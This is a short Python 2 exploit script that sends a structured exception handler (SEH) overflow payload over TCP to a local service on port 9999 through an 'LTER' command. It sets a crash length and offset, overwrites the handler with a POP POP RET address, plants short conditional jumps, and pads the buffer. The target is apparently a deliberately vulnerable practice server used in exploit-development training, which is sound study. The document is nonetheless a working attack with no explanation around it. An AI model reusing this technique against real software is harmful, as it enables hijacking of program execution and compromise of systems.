import socket
import struct
import os
import sys

vuln_command = "LTER _.?"
crash = 4000
offset = 3520
seh = struct.pack("<I", 0x6250120b)    # POP POP RET

# 1st Stage Shellcode (Short JMP - nSEH)
stage1 = ""
stage1 += "\x75\x08"              # JNZ SHORT [+0x10] = Jump if ZF is not 0
stage1 += "\x74\x06"              # JZ SHORT [+0x8] = Jump if ZF is 0

payload = ""
payload += vuln_command
payload += "A" * (offset - len(stage1))
payload += stage1
payload += seh
payload += "C" * (crash - 4 - offset)

print "[+] Sending buffer (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
print(s.recv(1024))
s.send(payload)
s.close()

